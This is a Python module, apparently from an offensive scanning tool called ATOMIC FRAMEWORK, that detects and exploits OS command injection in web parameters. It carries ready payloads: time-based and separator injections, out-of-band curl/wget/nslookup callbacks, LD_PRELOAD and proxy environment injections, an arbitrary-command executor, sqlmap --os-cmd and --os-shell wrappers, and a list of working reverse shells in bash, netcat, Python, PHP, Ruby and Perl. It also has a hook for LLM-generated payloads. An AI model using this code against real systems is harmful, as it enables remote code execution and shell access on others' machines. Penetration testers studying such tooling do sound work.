#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ATOMIC FRAMEWORK - Command Injection Module
OS Command Injection detection and exploitation

Includes native detection techniques and optional sqlmap integration
for OS command execution via confirmed SQL injection points.
"""

import os
import re
import shutil
import subprocess
import time


from config import Payloads, Colors
from modules.base import BaseModule


class CommandInjectionModule(BaseModule):
    """Command Injection Testing Module"""

    name = "Command Injection"
    vuln_type = "cmdi"

    def __init__(self, engine):
        super().__init__(engine)

        # Command output indicators
        self.cmd_indicators = {
            "unix": [
                r"uid=\d+\(\w+\)\s+gid=\d+",
                r"root:x:\d+:\d+:",
                r"bin:x:\d+:\d+:",
                r"daemon:x:\d+:\d+:",
                r"Linux\s+\w+\s+\d+\.\d+",
                r" drwx",
                r"-rw-r--r--",
                r"lrwxrwxrwx",
                r"/bin/bash",
                r"/bin/sh",
                r"/etc/passwd",
                r"/etc/shadow",
            ],
            "windows": [
                r"Windows\s+\w+\s+\[Version\s+\d+\.\d+",
                r"Program Files",
                r"WINDOWS\\system32",
                r"Volume Serial Number",
                r"Directory of",
                r"\\Users\\",
                r"\\Windows\\",
                r"ADMINISTRATOR",
            ],
            "generic": [
                r"uid=\d+\s*\(\w+\)",
            ],
        }

    def test(self, url: str, method: str, param: str, value: str):
        """Test for Command Injection"""
        # Test basic command injection
        self._test_basic(url, method, param, value)

        # Test blind command injection (time-based)
        self._test_blind(url, method, param, value)

        # Test with different separators
        self._test_separators(url, method, param, value)

        # Test OOB command injection
        self._test_oob_cmdi(url, method, param, value)

        # Test argument injection
        self._test_argument_injection(url, method, param, value)

        # Test environment variable injection
        self._test_env_injection(url, method, param, value)

        # LLM-generated adaptive CMDi payloads
        self._test_llm_payloads(url, method, param, value)

        # sqlmap OS command execution (optional, requires sqlmap installed)
        if self.engine.config.get("modules", {}).get("sqlmap", False):
            self._test_sqlmap_os(url, method, param, value)

    def _test_oob_cmdi(self, url: str, method: str, param: str, value: str):
        """Test OOB command injection"""
        oob = self.engine.config.get("oob_domain", "oob.callback.example.com")
        payloads = [
            f"; nslookup {oob}",
            f"| curl http://{oob}/",
            f"$(wget http://{oob}/)",
        ]
        for payload in payloads:
            try:
                data = {param: f"{value}{payload}"}
                response = self.requester.request(url, method, data=data)
                if response:
                    from core.engine import Finding

                    finding = Finding(
                        technique="Command Injection (OOB Exfiltration)",
                        url=url,
                        severity="INFO",
                        confidence=0.4,
                        param=param,
                        payload=payload,
                        evidence=f"OOB payload sent — verify at {oob}",
                    )
                    self.engine.add_finding(finding)
                    return
            except Exception:
                continue

    def _test_argument_injection(self, url: str, method: str, param: str, value: str):
        """Test argument injection"""
        payloads = ["--output=/tmp/pwned", "-exec cat /etc/passwd ;", "--config=/dev/null"]
        indicators = ["root:x:0:0:", "/bin/bash", "pwned"]

        # Get baseline to filter pre-existing content
        try:
            baseline_response = self.requester.request(url, method, data={param: value})
            baseline_text = baseline_response.text.lower() if baseline_response else ""
        except Exception:
            baseline_text = ""

        for payload in payloads:
            try:
                data = {param: payload}
                response = self.requester.request(url, method, data=data)
                if not response:
                    continue
                text = response.text.lower()
                # Only flag if indicator is NEW (not in baseline)
                for ind in indicators:
                    if ind in text and ind not in baseline_text:
                        from core.engine import Finding

                        finding = Finding(
                            technique="Command Injection (Argument Injection)",
                            url=url,
                            severity="HIGH",
                            confidence=0.8,
                            param=param,
                            payload=payload,
                            evidence=f"Argument injection indicator: {ind}",
                        )
                        self.engine.add_finding(finding)
                        return
            except Exception:
                continue

    def _test_env_injection(self, url: str, method: str, param: str, value: str):
        """Test environment variable injection"""
        payloads = [
            "HTTP_PROXY=http://evil.example.com/",
            "LD_PRELOAD=/tmp/evil.so",
            "BASH_ENV=/etc/passwd",
        ]

        # Get baseline to filter pre-existing content
        try:
            baseline_response = self.requester.request(url, method, data={param: value})
            baseline_text = baseline_response.text.lower() if baseline_response else ""
        except Exception:
            baseline_text = ""

        for payload in payloads:
            try:
                data = {param: payload}
                response = self.requester.request(url, method, data=data)
                if not response:
                    continue
                text = response.text.lower()
                # Only flag if indicator is NEW (not in baseline)
                # Check for passwd file content indicating env variable was evaluated
                has_passwd = "root:x:0:0:" in text and "root:x:0:0:" not in baseline_text
                # Check for proxy injection evidence (the injected domain appears in response)
                env_payload_lower = payload.lower()
                has_env_evidence = False
                if "http_proxy=" in env_payload_lower:
                    # Extract the injected domain from the payload
                    proxy_url = payload.split("=", 1)[1] if "=" in payload else ""
                    proxy_domain = proxy_url.rstrip("/")
                    if proxy_domain and proxy_domain.lower() in text and proxy_domain.lower() not in baseline_text:
                        has_env_evidence = True
                if has_passwd or has_env_evidence:
                    from core.engine import Finding

                    finding = Finding(
                        technique="Command Injection (Environment Variable)",
                        url=url,
                        severity="MEDIUM",
                        confidence=0.6,
                        param=param,
                        payload=payload,
                        evidence="Environment variable injection possible",
                    )
                    self.engine.add_finding(finding)
                    return
            except Exception:
                continue

    def test_url(self, url: str):
        """Test URL for Command Injection"""

    def _test_basic(self, url: str, method: str, param: str, value: str):
        """Test for basic command injection"""
        payloads = Payloads.CMDI_PAYLOADS

        # Get baseline response to filter pre-existing indicators
        try:
            baseline_response = self.requester.request(url, method, data={param: value})
            baseline_text = baseline_response.text if baseline_response else ""
        except Exception:
            baseline_text = ""

        for payload in payloads:
            try:
                data = {param: f"{value}{payload}"}
                response = self.requester.request(url, method, data=data)

                if not response:
                    continue

                response_text = response.text

                # Check for command output indicators (only NEW ones)
                for os_type, indicators in self.cmd_indicators.items():
                    for indicator in indicators:
                        match_in_response = re.search(indicator, response_text, re.IGNORECASE)
                        match_in_baseline = re.search(indicator, baseline_text, re.IGNORECASE)
                        if match_in_response and not match_in_baseline:
                            from core.engine import Finding

                            finding = Finding(
                                technique=f"Command Injection ({os_type.upper()})",
                                url=url,
                                severity="CRITICAL",
                                confidence=0.95,
                                param=param,
                                payload=payload,
                                evidence=f"Command output detected: {indicator[:50]}",
                            )
                            self.engine.add_finding(finding)
                            return

            except Exception as e:
                if self.engine.config.get("verbose"):
                    print(f"{Colors.error(f'CMDi test error: {e}')}")

    def _test_blind(self, url: str, method: str, param: str, value: str):
        """Test for blind command injection (time-based)"""
        blind_payloads = [
            "; sleep 5",
            "| sleep 5",
            "&& sleep 5",
            "|| sleep 5",
            "`sleep 5`",
            "$(sleep 5)",
            "; ping -c 5 127.0.0.1",
            "| ping -n 5 127.0.0.1",
        ]

        # Measure baseline response time
        try:
            baseline_data = {param: value}
            baseline_start = time.time()
            self.requester.request(url, method, data=baseline_data)
            baseline_time = time.time() - baseline_start
        except Exception:
            baseline_time = 0

        for payload in blind_payloads:
            try:
                data = {param: f"{value}{payload}"}

                start_time = time.time()
                self.requester.request(url, method, data=data)
                elapsed = time.time() - start_time

                # Response must take significantly longer than baseline
                # and at least 4.8s (for sleep 5 payloads)
                if elapsed >= 4.8 and elapsed > baseline_time + 4.0:
                    from core.engine import Finding

                    finding = Finding(
                        technique="Command Injection (Blind/Time-based)",
                        url=url,
                        severity="CRITICAL",
                        confidence=0.85,
                        param=param,
                        payload=payload,
                        evidence=f"Response delayed by {elapsed:.2f}s (baseline: {baseline_time:.2f}s)",
                    )
                    self.engine.add_finding(finding)
                    return

            except Exception as e:
                if self.engine.config.get("verbose"):
                    print(f"{Colors.error(f'Blind CMDi test error: {e}')}")

    def _test_separators(self, url: str, method: str, param: str, value: str):
        """Test various command separators"""
        separators = [
            (";", "semicolon"),
            ("|", "pipe"),
            ("||", "or"),
            ("&", "background"),
            ("&&", "and"),
            ("`", "backtick"),
            ("$", "dollar"),
            ("\n", "newline"),
            ("\r\n", "crlf"),
            ("%0a", "url_newline"),
            ("%3b", "url_semicolon"),
        ]

        test_cmd = "echo cmdi_test_12345"

        for sep, sep_name in separators:
            try:
                payload = f"{value}{sep}{test_cmd}"
                data = {param: payload}
                response = self.requester.request(url, method, data=data)

                if not response:
                    continue

                if "cmdi_test_12345" in response.text:
                    from core.engine import Finding

                    finding = Finding(
                        technique=f"Command Injection ({sep_name})",
                        url=url,
                        severity="CRITICAL",
                        confidence=0.9,
                        param=param,
                        payload=payload,
                        evidence=f"Command separator '{sep}' works",
                    )
                    self.engine.add_finding(finding)
                    return

            except Exception as e:
                if self.engine.config.get("verbose"):
                    print(f"{Colors.error(f'Separator test error: {e}')}")

    def _test_llm_payloads(self, url: str, method: str, param: str, value: str):
        """Test with LLM-generated command injection payloads.

        Uses Qwen2.5-7B context-aware payload generation when
        ``--local-llm`` is active.  Gracefully skips otherwise.
        """
        ai = getattr(self.engine, "ai", None)
        if ai is None:
            return
        llm_payloads = ai.get_llm_payloads("cmdi", param)
        if not llm_payloads:
            return

        for payload in llm_payloads:
            try:
                data = {param: payload}
                response = self.requester.request(url, method, data=data)
                if not response:
                    continue
                response_text = response.text
                for os_type, patterns in self.cmd_indicators.items():
                    for pattern in patterns:
                        if re.search(pattern, response_text, re.IGNORECASE):
                            from core.engine import Finding

                            finding = Finding(
                                technique=f"Command Injection - AI-generated ({os_type})",
                                url=url,
                                severity="CRITICAL",
                                confidence=0.85,
                                param=param,
                                payload=payload,
                                evidence=f"AI payload triggered {os_type} output",
                            )
                            self.engine.add_finding(finding)
                            return
            except Exception as e:
                if self.engine.config.get("verbose"):
                    print(f"{Colors.error(f'LLM CMDi test error: {e}')}")

    def exploit_execute(self, url: str, param: str, command: str, method: str = "GET") -> str:
        """Execute command via RCE.

        Tries native separator-based command injection first; falls back
        to sqlmap ``--os-cmd`` when the ``sqlmap`` module flag is enabled.
        """
        # Native separator-based execution
        separators = [";", "|", "&&", "||", "`"]

        for sep in separators:
            try:
                payload = f"{sep}{command}"
                data = {param: payload}
                response = self.requester.request(url, method, data=data)

                if response:
                    return response.text
            except Exception as e:
                print(f"{Colors.error(f'Command execution error: {e}')}")

        # Fallback to sqlmap --os-cmd if native injection didn't return
        if self.engine.config.get("modules", {}).get("sqlmap", False):
            result = self.sqlmap_os_cmd(url, param, command, method=method)
            if result:
                return result

        return None

    # ------------------------------------------------------------------
    # sqlmap CLI integration for OS command execution
    # ------------------------------------------------------------------

    @staticmethod
    def _find_sqlmap() -> str:
        """Return the sqlmap executable path or empty string if not found."""
        path = shutil.which("sqlmap")
        if path:
            return path
        for candidate in [
            "/usr/bin/sqlmap",
            "/usr/local/bin/sqlmap",
            "/usr/share/sqlmap/sqlmap.py",
            os.path.expanduser("~/.local/bin/sqlmap"),
            os.path.expanduser("~/sqlmap/sqlmap.py"),
            "/opt/sqlmap/sqlmap.py",
        ]:
            if os.path.isfile(candidate):
                return candidate
        return ""

    def _test_sqlmap_os(self, url: str, method: str, param: str, value: str):
        """Probe for OS command execution via sqlmap's --os-cmd.

        Uses ``id`` (Unix) as the probe command.  If sqlmap succeeds in
        executing it the result is registered as a CRITICAL finding.
        """
        sqlmap_bin = self._find_sqlmap()
        if not sqlmap_bin:
            if self.engine.config.get("verbose"):
                print(f"{Colors.warning('sqlmap not found — skipping OS command test')}")
            return

        result = self.sqlmap_os_cmd(
            url,
            param,
            "id",
            method=method,
            value=value,
            sqlmap_bin=sqlmap_bin,
        )
        if result and re.search(r"uid=\d+", result):
            from core.engine import Finding

            finding = Finding(
                technique="Command Injection (sqlmap --os-cmd)",
                url=url,
                severity="CRITICAL",
                confidence=0.95,
                param=param,
                payload="id",
                evidence=f"sqlmap OS command output: {result[:200]}",
            )
            self.engine.add_finding(finding)

    def sqlmap_os_cmd(
        self,
        url: str,
        param: str,
        command: str,
        *,
        method: str = "GET",
        value: str = "",
        sqlmap_bin: str = "",
        timeout: int = 120,
    ) -> str:
        """Execute an OS command via sqlmap's ``--os-cmd`` feature.

        Parameters
        ----------
        url : str
            Target URL.
        param : str
            Vulnerable parameter name.
        command : str
            OS command to execute.
        method : str
            HTTP method.
        value : str
            Current parameter value.
        sqlmap_bin : str
            Path to sqlmap binary (auto-detected if empty).
        timeout : int
            Maximum seconds to wait.

        Returns
        -------
        str
            Command output or empty string on failure.
        """
        if not sqlmap_bin:
            sqlmap_bin = self._find_sqlmap()
        if not sqlmap_bin:
            return ""

        try:
            if method.upper() == "GET":
                separator = "&" if "?" in url else "?"
                target_url = f"{url}{separator}{param}={value}"
                cmd = [sqlmap_bin, "-u", target_url, "-p", param]
            else:
                cmd = [
                    sqlmap_bin,
                    "-u",
                    url,
                    "--data",
                    f"{param}={value}",
                    "-p",
                    param,
                ]

            cmd.extend(["--batch", "--os-cmd", command])

            if sqlmap_bin.endswith(".py"):
                cmd = ["python3", *cmd]

            proc = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=timeout,
            )

            # Extract command output from sqlmap stdout
            output_lines = []
            capture = False
            for line in proc.stdout.splitlines():
                if "command standard output" in line.lower():
                    capture = True
                    continue
                if capture:
                    if line.strip() == "---":
                        break
                    output_lines.append(line)

            return "\n".join(output_lines).strip() if output_lines else ""

        except subprocess.TimeoutExpired:
            return ""
        except Exception as e:
            if self.engine.config.get("verbose"):
                print(f"{Colors.error(f'sqlmap OS cmd error: {e}')}")
            return ""

    def sqlmap_os_shell_interactive(
        self, url: str, param: str, *, method: str = "GET", value: str = "", timeout: int = 300
    ) -> str:
        """Attempt to get an interactive OS shell via sqlmap.

        Returns the sqlmap process output.  In practice, interactive mode
        is hard to automate so this wraps ``--os-shell`` with ``--batch``.
        """
        sqlmap_bin = self._find_sqlmap()
        if not sqlmap_bin:
            return ""

        try:
            if method.upper() == "GET":
                separator = "&" if "?" in url else "?"
                target_url = f"{url}{separator}{param}={value}"
                cmd = [sqlmap_bin, "-u", target_url, "-p", param]
            else:
                cmd = [
                    sqlmap_bin,
                    "-u",
                    url,
                    "--data",
                    f"{param}={value}",
                    "-p",
                    param,
                ]

            cmd.extend(["--batch", "--os-shell"])

            if sqlmap_bin.endswith(".py"):
                cmd = ["python3", *cmd]

            proc = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=timeout,
            )
            return proc.stdout

        except subprocess.TimeoutExpired:
            return ""
        except Exception:
            return ""

        return None

    def get_reverse_shell(self, url: str, param: str, host: str, port: int) -> str:
        """Generate reverse shell command"""
        shells = [
            f"bash -i >& /dev/tcp/{host}/{port} 0>&1",
            f"nc -e /bin/sh {host} {port}",
            f"nc -c bash {host} {port}",
            f'python -c \'import socket,subprocess,os;s=socket.socket();s.connect(("{host}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh"])\'',
            f'python3 -c \'import socket,subprocess,os;s=socket.socket();s.connect(("{host}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh"])\'',
            f'php -r \'$sock=fsockopen("{host}",{port});exec("/bin/sh -i <&3 >&3 2>&3");\'',
            f'ruby -rsocket -e\'f=TCPSocket.open("{host}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
            f'perl -e \'use Socket;$i="{host}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\'',
        ]

        return shells[0]  # Return bash reverse shell as default
